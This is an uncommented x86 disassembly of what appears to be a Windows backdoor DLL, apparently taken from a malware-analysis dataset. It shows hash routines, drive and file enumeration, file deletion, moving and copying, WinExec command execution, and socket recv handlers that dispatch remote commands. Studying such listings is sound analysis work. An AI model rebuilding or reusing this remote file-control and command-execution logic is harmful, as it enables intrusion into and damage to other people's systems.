lea esi [ edi + esi - 0x100b83 ]
rol esi 0xf
add esi edx
mov edi eax
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x44 ]
lea ecx [ edi + ecx - 0x7a7ba22f ]
ror ecx 0xb
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi [ ebp - 0x28 ]
lea eax [ edi + eax + 0x6fa87e4f ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0xc ]
lea edx [ edi + edx - 0x1d31920 ]
mov edi ecx
rol edx 0xa
add edx eax
not edi
or edi edx
xor edi eax
add edi [ ebp - 0x30 ]
lea esi [ edi + esi - 0x5cfebcec ]
mov edi eax
rol esi 0xf
add esi edx
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x14 ]
lea edi [ edi + ecx + 0x4e0811a1 ]
ror edi 0xb
add edi esi
mov ecx edx
not ecx
or ecx edi
xor ecx esi
add ecx [ ebp - 0x38 ]
lea eax [ ecx + eax - 0x8ac817e ]
rol eax 0x6
add eax edi
mov ecx esi
not ecx
or ecx eax
xor ecx edi
add ecx [ ebp - 0x1c ]
lea edx [ ecx + edx - 0x42c50dcb ]
rol edx 0xa
add edx eax
mov ecx edi
not ecx
or ecx edx
xor ecx eax
add ecx [ ebp - 0x40 ]
lea esi [ ecx + esi + 0x2ad7d2bb ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
add ebx eax
not eax
rol esi 0xf
add esi edx
or eax esi
xor eax edx
add eax [ ebp - 0x24 ]
mov [ ecx ] ebx
lea eax [ eax + edi - 0x14792c6f ]
ror eax 0xb
add eax [ ecx + 0x4 ]
add eax esi
mov [ ecx + 0x4 ] eax
mov eax [ ecx + 0x8 ]
add eax esi
mov [ ecx + 0x8 ] eax
mov eax [ ecx + 0xc ]
pop edi
add eax edx
pop esi
mov [ ecx + 0xc ] eax
pop ebx
leave
retn 0x4
sub_100051ad
test edx edx
jbe r-xdata
retn
push esi
lea esi [ edx - 0x1 ]
shr esi 0x2
inc ecx
add eax 0x2
inc esi
mov dl [ eax - 0x2 ]
mov [ ecx - 0x1 ] dl
mov dl [ eax - 0x1 ]
mov [ ecx ] dl
mov dl [ eax ]
mov [ ecx + 0x1 ] dl
mov dl [ eax + 0x1 ]
mov [ ecx + 0x2 ] dl
add eax 0x4
add ecx 0x4
dec esi
jne r-xdata
pop esi
sub_100051de
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
push edi
lea ebx [ esi + 0x200c ]
lea edi [ esi + 0x2044 ]
call sub_10004a9d
xor edi edi
add esi 0x2020
mov [ ebp - 0x4 ] esi
movzx eax [ ebx + edi ]
push eax
push r--data
push [ ebp - 0x4 ]
call sub_1000b210
add [ ebp - 0x4 ] 0x2
add esp 0xc
inc edi
cmp edi 0x10
jl r-xdata
xor ecx ecx
mov al [ esi + ecx ]
mov edx [ ebp + 0x8 ]
mov [ ecx + edx ] al
inc ecx
cmp ecx 0x20
jl r-xdata
pop edi
mov eax edx
pop esi
mov [ ecx + eax ] 0x0
pop ebx
leave
retn 0x4
sub_10005240
push ebp
mov ebp esp
sub esp 0x25c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
lea ecx [ ebp - 0x25c ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
push eax
call [ FindClose@IAT ]
mov eax [ ebp - 0x25c ]
mov [ esi ] eax
mov eax [ ebp - 0x258 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x254 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x250 ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x24c ]
push 0x1
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x248 ]
push 0x0
push 0x0
push [ ebp - 0x240 ]
mov [ esi + 0x14 ] eax
mov eax [ ebp - 0x244 ]
mov [ esi + 0x18 ] eax
call sub_100169a0
mov ecx [ ebp - 0x23c ]
xor edi edi
add eax ecx
adc edx edi
mov [ esi + 0x20 ] eax
lea eax [ ebp - 0x230 ]
mov [ esi + 0x24 ] edx
push eax
add esi 0x28
push esi
call sub_1000b34d
pop ecx
pop ecx
mov al 0x1
xor al al
jmp r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
xor ecx ebp
pop esi
call sub_1000ac69
leave
retn
sub_100052fb
mov eax [ esi ]
and al 0x10
movzx eax al
push edi
neg eax
push 0x0
sbb eax eax
and eax 0x1ffff80
sub eax 0xffffff80
push eax
push 0x3
push 0x0
push 0x5
push 0xc0000000
push [ esp + 0x20 ]
call [ CreateFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push ebx
lea eax [ esi + 0x14 ]
push eax
lea eax [ esi + 0xc ]
push eax
lea eax [ esi + 0x4 ]
push eax
push edi
call [ SetFileTime@IAT ]
test eax eax
setne bl
test bl bl
je r-xdata
xor al al
pop edi
retn
push edi
call [ CloseHandle@IAT ]
mov al bl
pop ebx
pop edi
retn
push [ esi ]
push [ esp + 0x10 ]
call [ SetFileAttributesW@IAT ]
test eax eax
setne bl
sub_1000539b
push ebp
lea ebp [ esp - 0x39c ]
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x398 ] eax
mov eax [ ebp + 0x3a4 ]
push ebx
push esi
push edi
mov esi 0x208
push esi
mov [ ebp - 0x80 ] eax
lea eax [ ebp + 0x190 ]
mov edi ecx
push 0x0
push eax
mov [ ebp - 0x7c ] edi
call sub_1000b660
push esi
lea eax [ ebp - 0x78 ]
push 0x0
push eax
call sub_1000b660
mov eax [ ebp - 0x80 ]
add esp 0x18
lea ebx [ ebp + 0x190 ]
call sub_10008803
test eax eax
je r-xdata
lea eax [ ebp + 0x190 ]
push eax
call sub_1001265d
mov [ esp ] r--data
push eax
call sub_10005384
test eax eax
je r-xdata
push eax
push r--data
lea eax [ ebp - 0x78 ]
push esi
push eax
call sub_1000b83c
add esp 0x10
push r--data
lea eax [ ebp + 0x190 ]
push eax
call sub_10005384
test eax eax
je r-xdata
push 0x0
push edi
call sub_1000536c
xor eax eax
jmp r-xdata
push r--data
lea eax [ ebp + 0x190 ]
push eax
call sub_10005384
test eax eax
je r-xdata
lea ecx [ ebp - 0x78 ]
mov esi edi
call sub_10005634
jmp r-xdata
mov ecx [ ebp + 0x398 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
add ebp 0x39c
leave
retn 0x4
push r--data
lea eax [ ebp + 0x190 ]
push eax
call sub_10005384
test eax eax
je r-xdata
lea eax [ ebp - 0x78 ]
push eax
mov ecx edi
call sub_10005974
jmp r-xdata
xor eax eax
inc eax
push r--data
lea eax [ ebp + 0x190 ]
push eax
call sub_10005384
test eax eax
je r-xdata
lea eax [ ebp - 0x78 ]
push eax
push edi
call sub_10005a46
jmp r-xdata
push r--data
lea eax [ ebp + 0x190 ]
push eax
call sub_10005384
test eax eax
je r-xdata
lea eax [ ebp - 0x78 ]
push eax
push edi
call sub_10005b4c
jmp r-xdata
push r--data
lea eax [ ebp + 0x190 ]
push eax
call sub_10005384
test eax eax
je r-xdata
push edi
lea esi [ ebp - 0x78 ]
call sub_10005ff9
jmp r-xdata
push r--data
lea eax [ ebp + 0x190 ]
push eax
call sub_10005384
test eax eax
je r-xdata
lea eax [ ebp - 0x78 ]
push eax
call sub_1000b38d
pop ecx
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] edx
push 0x0
jmp r-xdata
push r--data
lea eax [ ebp + 0x190 ]
push eax
call sub_10005384
test eax eax
je r-xdata
mov esi [ ebp - 0x7c ]
lea edi [ ebp - 0x78 ]
call sub_10005f7a
jmp r-xdata
push edi
call sub_1000536c
push r--data
lea eax [ ebp + 0x190 ]
push eax
call sub_10005384
test eax eax
je r-xdata
lea eax [ ebp - 0x78 ]
push eax
mov esi edi
call sub_100060d8
jmp r-xdata
push r--data
lea eax [ ebp + 0x190 ]
push eax
call sub_10005384
test eax eax
je r-xdata
lea eax [ ebp - 0x78 ]
push eax
mov ebx edi
call sub_100061bd
jmp r-xdata
push r--data
lea eax [ ebp + 0x190 ]
push eax
call sub_10005384
test eax eax
je r-xdata
lea esi [ ebp - 0x78 ]
call sub_10005f23
jmp r-xdata
push r--data
lea eax [ ebp + 0x190 ]
push eax
call sub_10005384
test eax eax
je r-xdata
lea eax [ ebp - 0x78 ]
push eax
mov esi edi
call sub_10006071
jmp r-xdata
push r--data
lea eax [ ebp + 0x190 ]
push eax
call sub_10005384
test eax eax
je r-xdata
mov ecx [ ebp - 0x7c ]
lea edi [ ebp - 0x78 ]
call sub_10006380
jmp r-xdata
push 0x16
lea eax [ ebp - 0x78 ]
push eax
mov esi edi
call sub_1000653a
jmp r-xdata
sub_10005634
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x698
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x694 ] eax
push ebx
push edi
mov ebx 0x230
push ebx
lea eax [ esp + 0x14 ]
push 0xff
push eax
mov edi ecx
call sub_1000b660
push edi
call sub_1000b3ed
add esp 0x10
test eax eax
jne r-xdata
and [ esp + 0xc ] 0x0
push edi
lea eax [ esp + 0x494 ]
push r--data
push eax
call sub_1000b90f
add esp 0xc
lea eax [ esp + 0x240 ]
push eax
lea eax [ esp + 0x494 ]
push eax
call [ FindFirstFileW@IAT ]
mov [ esp + 0x8 ] eax
cmp eax 0xffffffff
jne r-xdata
xor edi edi
push edi
push esi
call sub_1000536c
push edi
lea eax [ esi + 0x10 ]
push r--data
push eax
call sub_1000b90f
add esp 0xc
push 0x0
push esi
call sub_1000536c
call [ GetLastError@IAT ]
push eax
push esi
call sub_1000536c
or eax 0xffffffff
jmp r-xdata
inc edi
cmp edi 0x1a
jl r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x8 ]
push ecx
push [ esi ]
add eax 0x12d
call sub_10006dde
pop ecx
pop ecx
lea eax [ esp + 0x240 ]
push eax
push [ esp + 0xc ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x26c ]
push r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ esp + 0x69c ]
pop edi
pop ebx
xor ecx esp
call sub_1000ac69
mov esp ebp
pop ebp
retn
lea eax [ edi + 0x41 ]
push eax
lea eax [ esp + 0x3c ]
push r--data
push eax
call sub_1000b90f
mov [ esp + 0x14 ] eax
add esp 0xc
lea eax [ esp + 0x38 ]
push eax
call [ GetDriveTypeW@IAT ]
cmp eax 0x1
je r-xdata
push ebx
lea eax [ esp + 0x14 ]
push 0x0
push eax
call sub_1000b660
lea eax [ esp + 0x1c ]
push eax
push [ esi ]
mov eax 0x12c
call sub_10006dde
add esp 0x14
xor eax eax
jmp r-xdata
lea eax [ esp + 0x26c ]
push r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
lea eax [ esp + 0x14 ]
push 0x0
push eax
call sub_1000b660
lea eax [ esp + 0x1c ]
push eax
push [ esi ]
mov eax 0x12c
call sub_10006dde
add esp 0x14
push [ esp + 0x8 ]
call [ FindClose@IAT ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x244 ]
mov eax [ esp + 0x240 ]
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x248 ]
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x24c ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x250 ]
mov [ esp + 0x20 ] ecx
mov ecx [ esp + 0x254 ]
mov [ esp + 0x24 ] ecx
mov ecx [ esp + 0x258 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x28 ] ecx
test al 0x10
je r-xdata
push 0x1
push 0x0
push 0x0
push [ esp + 0x268 ]
call sub_100169a0
mov ecx [ esp + 0x260 ]
xor edi edi
add eax ecx
adc edx edi
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] edx
or [ esp + 0x30 ] 0xffffffff
or [ esp + 0x34 ] 0xffffffff
jmp r-xdata
inc [ esp + 0xc ]
lea eax [ esp + 0x26c ]
push eax
lea eax [ esp + 0x3c ]
push r--data
push eax
call sub_1000b90f
lea edi [ eax + 0x12d ]
lea eax [ esp + 0x1c ]
push eax
push [ esi ]
mov eax edi
call sub_10006dde
add esp 0x14
cmp eax edi
jne r-xdata
sub_100058c7
push ebp
lea ebp [ esp - 0x190 ]
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x18c ] eax
and [ ebp - 0x80 ] 0x0
push ebx
push esi
mov esi [ ebp + 0x19c ]
push edi
mov edi [ ebp + 0x1a4 ]
lea eax [ esi + 0x28 ]
push eax
mov eax [ edi ]
add eax 0x10
push eax
lea eax [ ebp - 0x7c ]
push r--data
push eax
call sub_1000b90f
mov ebx [ SetFileAttributesW@IAT ]
add esp 0x10
test [ esi ] 0x1
je r-xdata
test [ esi ] 0x10
lea eax [ ebp - 0x7c ]
push eax
je r-xdata
push 0x80
lea eax [ ebp - 0x7c ]
push eax
call ebx
mov [ ebp - 0x80 ] eax
call [ DeleteFileW@IAT ]
call [ RemoveDirectoryW@IAT ]
jmp r-xdata
cmp [ ebp - 0x80 ] 0x0
je r-xdata
inc [ edi + 0x4 ]
jmp r-xdata
test eax eax
je r-xdata
mov ecx [ ebp + 0x18c ]
pop edi
xor eax eax
pop esi
xor ecx ebp
inc eax
pop ebx
call sub_1000ac69
add ebp 0x190
leave
retn 0x10
push [ esi ]
lea eax [ ebp - 0x7c ]
push eax
call ebx
sub_10005974
push ebp
mov ebp esp
sub esp 0x81c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push edi
lea ecx [ ebp - 0x814 ]
push ecx
lea ecx [ ebp - 0x614 ]
push ecx
lea ecx [ ebp - 0x414 ]
push ecx
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_1000bc56
lea eax [ ebp - 0x414 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov edi r--data
lea eax [ ebp - 0x214 ]
push edi
push eax
call sub_1000b90f
add esp 0x24
lea edx [ ebp - 0x214 ]
call sub_10005e13
lea eax [ ebp - 0x814 ]
push eax
lea eax [ ebp - 0x614 ]
push eax
lea eax [ ebp - 0x214 ]
push edi
push eax
call sub_1000b90f
add esp 0x10
xor eax eax
push eax
lea ecx [ ebp - 0x81c ]
push ecx
push sub_100058c7
push eax
mov [ ebp - 0x818 ] eax
lea eax [ ebp - 0x214 ]
push eax
mov ecx esi
mov [ ebp - 0x81c ] esi
call sub_10005b9c
sub eax [ ebp - 0x818 ]
neg eax
sbb eax eax
and eax 0x5
push eax
push esi
call sub_1000536c
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_1000ac69
leave
retn 0x4
sub_10005a46
push ebp
lea ebp [ esp - 0x3b8 ]
sub esp 0x438
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x3b4 ] eax
mov eax [ ebp + 0x3c4 ]
push edi
lea ecx [ ebp - 0x60 ]
push ecx
push eax
call [ CommandLineToArgvW@IAT ]
cmp [ ebp - 0x60 ] 0x2
mov edi eax
je r-xdata
push ebx
push esi
xor eax eax
mov esi 0x206
push esi
mov [ ebp + 0x1ac ] ax
xor ebx ebx
lea eax [ ebp + 0x1ae ]
push ebx
push eax
call sub_1000b660
xor eax eax
push esi
mov [ ebp - 0x5c ] ax
lea eax [ ebp - 0x5a ]
push ebx
push eax
call sub_1000b660
push [ edi ]
mov esi r--data
lea eax [ ebp + 0x1ac ]
push esi
push eax
call sub_1000b90f
push [ edi + 0x4 ]
lea eax [ ebp - 0x5c ]
push esi
push eax
call sub_1000b90f
push 0x1e
lea eax [ ebp - 0x80 ]
push ebx
push eax
call sub_1000b660
mov eax 0x61c
mov [ ebp - 0x70 ] ax
lea eax [ ebp + 0x1ac ]
mov [ ebp - 0x78 ] eax
lea eax [ ebp - 0x5c ]
mov [ ebp - 0x74 ] eax
add esp 0x3c
lea eax [ ebp - 0x80 ]
push eax
mov [ ebp - 0x6a ] ebx
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x66 ] ebx
mov [ ebp - 0x7c ] 0x1
call [ SHFileOperationW@IAT ]
mov esi eax
push esi
push [ ebp + 0x3c0 ]
call sub_1000536c
mov eax esi
pop esi
pop ebx
push 0x57
push [ ebp + 0x3c0 ]
call sub_1000536c
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x3b4 ]
xor ecx ebp
pop edi
call sub_1000ac69
add ebp 0x3b8
leave
retn 0x8
sub_10005b4c
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0xc ]
call [ CommandLineToArgvW@IAT ]
cmp [ ebp + 0xc ] 0x2
je r-xdata
push esi
push [ eax + 0x4 ]
push [ eax ]
call [ MoveFileW@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x57
push [ ebp + 0x8 ]
call sub_1000536c
xor eax eax
jmp r-xdata
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
pop ebp
retn 0x8
push eax
push [ ebp + 0x8 ]
call sub_1000536c
mov eax esi
pop esi
sub_10005b9c
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x6a4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x6a0 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov [ esp + 0x14 ] eax
mov eax [ ebp + 0x14 ]
push edi
mov esi ecx
mov [ esp + 0x14 ] eax
call sub_100062d1
test eax eax
je r-xdata
and [ esp + 0x10 ] 0x0
cmp [ ebp + 0xc ] 0x0
push ebx
lea eax [ esi + 0x10 ]
lea edi [ esi + 0x218 ]
push eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
push r--data
push r--data
jmp r-xdata
mov ecx [ esp + 0x6ac ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_1000ac69
mov esp ebp
pop ebp
retn 0x14
lea eax [ esp + 0x27c ]
push r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_1000b90f
add esp 0x10
lea eax [ esp + 0x4a0 ]
mov edx edi
call sub_100081cb
lea eax [ esp + 0x250 ]
push eax
lea eax [ esp + 0x4a4 ]
push eax
call [ FindFirstFileW@IAT ]
mov [ esp + 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
lea eax [ esp + 0x250 ]
push eax
push [ esp + 0x20 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x27c ]
push r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esp + 0x1c ]
call [ FindClose@IAT ]
mov eax [ esp + 0x10 ]
mov eax [ esp + 0x250 ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x254 ]
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x258 ]
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x25c ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x260 ]
push 0x1
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x268 ]
push 0x0
push 0x0
push [ esp + 0x278 ]
mov [ esp + 0x44 ] eax
mov eax [ esp + 0x278 ]
mov [ esp + 0x48 ] eax
call sub_100169a0
mov ecx [ esp + 0x270 ]
xor edi edi
add eax ecx
adc edx edi
cmp [ ebp + 0xc ] 0x0
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] edx
je r-xdata
push ebx
lea eax [ esp + 0x4c ]
push r--data
push eax
call sub_1000b90f
add esp 0xc
lea eax [ esp + 0x27c ]
push eax
push ebx
lea eax [ esp + 0x50 ]
push r--data
push eax
call sub_1000b90f
add esp 0x10
jmp r-xdata
inc [ esp + 0x10 ]
test [ esp + 0x20 ] 0x10
je r-xdata
push [ esp + 0x14 ]
lea eax [ edi + 0x12d ]
push eax
lea eax [ esp + 0x28 ]
push eax
push 0x0
call [ esp + 0x28 ]
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] 0x0
mov edi eax
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ esp + 0x14 ]
add edi 0x12d
push edi
lea eax [ esp + 0x28 ]
push eax
push 0x0
call [ esp + 0x28 ]
test eax eax
je r-xdata
push ebx
lea eax [ esp + 0x4a4 ]
push r--data
push eax
call sub_1000b90f
add esp 0xc
lea eax [ esp + 0x27c ]
push eax
push ebx
lea eax [ esp + 0x4a8 ]
push r--data
push eax
call sub_1000b90f
add esp 0x10
jmp r-xdata
add [ esp + 0x10 ] eax
push [ ebp + 0x18 ]
lea eax [ esp + 0x4a4 ]
push [ esp + 0x18 ]
mov ecx esi
push [ esp + 0x20 ]
push 0x1
push eax
call sub_10005b9c
cmp eax 0xffffffff
je r-xdata
sub_10005e2b
push ebp
mov ebp esp
sub esp 0xa24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push edi
lea ecx [ ebp - 0x41c ]
push ecx
lea ecx [ ebp - 0x81c ]
push ecx
lea ecx [ ebp - 0x61c ]
push ecx
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1000bc56
lea eax [ ebp - 0x61c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov edi r--data
lea eax [ ebp - 0x21c ]
push edi
push eax
call sub_1000b90f
lea eax [ esi + 0x10 ]
push eax
lea eax [ ebp - 0xa24 ]
push r--data
push eax
call sub_1000b90f
add esp 0x30
lea edx [ ebp - 0x21c ]
call sub_10005e13
lea eax [ ebp - 0x41c ]
push eax
lea eax [ ebp - 0x81c ]
push eax
lea eax [ ebp - 0x21c ]
push edi
push eax
call sub_1000b90f
add esp 0x10
push 0x1
push [ esi ]
lea eax [ ebp - 0x21c ]
push sub_100058a8
push 0x0
push eax
mov ecx esi
call sub_10005b9c
lea edx [ ebp - 0xa24 ]
mov edi eax
call sub_10005e13
push 0x208
lea eax [ ebp - 0x21c ]
push 0x0
push eax
call sub_1000b660
lea eax [ ebp - 0x21c ]
push eax
push [ esi ]
mov eax 0x12c
call sub_10006dde
mov ecx [ ebp - 0x8 ]
add esp 0x14
mov eax edi
pop edi
xor ecx ebp
pop esi
call sub_1000ac69
leave
retn 0x4
sub_10005f23
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x238
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x234 ] eax
push esi
lea ecx [ esp + 0x4 ]
call sub_10005240
pop ecx
test al al
jne r-xdata
push 0x0
push edi
call sub_1000536c
push esi
mov ecx edi
call sub_10005e2b
push 0x2
push edi
call sub_1000536c
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x234 ]
xor ecx esp
call sub_1000ac69
mov esp ebp
pop ebp
retn
sub_10005f7a
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x440
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x43c ] eax
push 0x230
lea eax [ esp + 0x4 ]
push 0x0
push eax
call sub_1000b660
add esp 0xc
push edi
lea eax [ esi + 0x10 ]
push eax
lea eax [ esp + 0x238 ]
push r--data
push eax
call sub_1000b90f
lea eax [ esp + 0x240 ]
push eax
lea ecx [ esp + 0x14 ]
call sub_10005240
add esp 0x14
lea eax [ esp + 0x20 ]
push eax
push [ esi ]
push 0x8
pop eax
call sub_10006dde
pop ecx
pop ecx
mov ecx [ esp + 0x43c ]
xor eax eax
xor ecx esp
inc eax
call sub_1000ac69
mov esp ebp
pop ebp
retn
sub_10005ff9
push ebp
mov ebp esp
sub esp 0x404
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push 0x3ff
lea eax [ ebp - 0x403 ]
push ebx
push eax
mov [ ebp - 0x404 ] bl
call sub_1000b660
add esp 0xc
push ebx
push ebx
push esi
lea eax [ ebp - 0x404 ]
push 0x400
push eax
call sub_10008113
add esp 0x10
push eax
call [ WinExec@IAT ]
cmp eax 0x20
jbe r-xdata
call [ GetLastError@IAT ]
push eax
push ebx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1000536c
mov ecx [ ebp - 0x4 ]
xor eax eax
xor ecx ebp
inc eax
pop ebx
call sub_1000ac69
leave
retn 0x4
sub_10006071
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ esi + 0x10 ]
push eax
lea eax [ ebp - 0x20c ]
push r--data
push eax
call sub_1000b90f
add esp 0x10
push 0x0
lea eax [ ebp - 0x20c ]
push eax
call [ CreateDirectoryW@IAT ]
mov edi eax
test edi edi
je r-xdata
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
push eax
push esi
call sub_1000536c
mov ecx [ ebp - 0x4 ]
mov eax edi
xor ecx ebp
pop edi
call sub_1000ac69
leave
retn 0x4
sub_100060d8
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x448
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x444 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0xc ]
push ebx
mov ebx [ esi + 0x8 ]
push edi
push eax
lea eax [ esi + 0x10 ]
push eax
lea eax [ esp + 0x248 ]
xor edi edi
push r--data
push eax
mov [ esp + 0x1c ] ecx
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
call sub_1000b90f
lea eax [ esp + 0x250 ]
push eax
lea ecx [ esp + 0x24 ]
call sub_10005240
add esp 0x14
test al al
jne r-xdata
push edi
push 0x80
push 0x3
push edi
push 0x1
push 0x80000000
lea eax [ esp + 0x258 ]
push eax
call [ CreateFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
push 0x2
jmp r-xdata
push eax
call [ CloseHandle@IAT ]
push edi
push esi
call sub_1000536c
test [ esp + 0x10 ] 0x10
je r-xdata
call [ GetLastError@IAT ]
push eax
jmp r-xdata
push esi
call sub_1000536c
push [ esp + 0xc ]
lea eax [ esp + 0x244 ]
push ebx
push eax
push [ esi ]
call sub_1000664f
add esp 0x10
cmp eax 0xffffffff
je r-xdata
xor eax eax
inc eax
jmp r-xdata
xor eax eax
push edi
mov ecx [ esp + 0x44c ]
pop edi
pop ebx
xor ecx esp
call sub_1000ac69
mov esp ebp
pop ebp
retn 0x4
sub_100061bd
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x448
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x444 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
push eax
lea eax [ ebx + 0x10 ]
push eax
lea eax [ esp + 0x248 ]
push r--data
push eax
call sub_1000b90f
add esp 0x10
lea eax [ esp + 0x240 ]
push eax
call [ GetFileAttributesW@IAT ]
mov edi [ SetFileAttributesW@IAT ]
mov [ esp + 0xc ] eax
mov esi 0x80
push esi
lea eax [ esp + 0x244 ]
push eax
call edi
push 0x0
push esi
push 0x4
push 0x0
push 0x2
push 0x40000000
lea eax [ esp + 0x258 ]
push eax
call [ CreateFileW@IAT ]
push [ esp + 0xc ]
mov esi eax
lea eax [ esp + 0x244 ]
push eax
call edi
cmp esi 0xffffffff
je r-xdata
call [ GetLastError@IAT ]
push eax
push ebx
call sub_1000536c
push esi
call [ CloseHandle@IAT ]
push 0x0
push ebx
call sub_1000536c
push 0xffffffff
lea eax [ esp + 0x14 ]
push eax
push [ ebx ]
mov edi 0x12c
call sub_10006d97
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0x44c ]
pop edi
pop esi
xor ecx esp
call sub_1000ac69
mov esp ebp
pop ebp
retn 0x4
xor eax eax
jmp r-xdata
push [ esp + 0x34 ]
lea ecx [ esp + 0x244 ]
push [ esp + 0x34 ]
push [ ebx ]
call sub_100067c7
add esp 0xc
test eax eax
je r-xdata
lea eax [ esp + 0x240 ]
push eax
lea esi [ esp + 0x14 ]
call sub_100052fb
xor eax eax
pop ecx
inc eax
sub_100062d1
push ebp
mov ebp esp
sub esp 0x150
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor eax eax
push 0x3e
mov [ ebp - 0x44 ] ax
xor ebx ebx
lea eax [ ebp - 0x42 ]
push ebx
push eax
call sub_1000b660
mov eax [ esi ]
add esp 0xc
mov [ ebp - 0x14c ] eax
lea eax [ ebp - 0x4c ]
push eax
push ebx
push ebx
lea eax [ ebp - 0x150 ]
push eax
push ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x150 ] 0x1
call [ select@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
push edi
mov edi [ recv@IAT ]
push 0x2
push 0xc
lea eax [ ebp - 0x44 ]
push eax
push [ esi ]
call edi
cmp eax ebx
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x38 ] cx
cmp eax 0xc
jne r-xdata
pop edi
xor eax eax
push r--data
lea eax [ ebp - 0x44 ]
push eax
call sub_10005384
test eax eax
je r-xdata
push ebx
push 0xc
lea eax [ ebp - 0x44 ]
push eax
push [ esi ]
call edi
sub_10006380
push ebp
mov ebp esp
mov eax 0x29a4
call sub_1001ac50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor eax eax
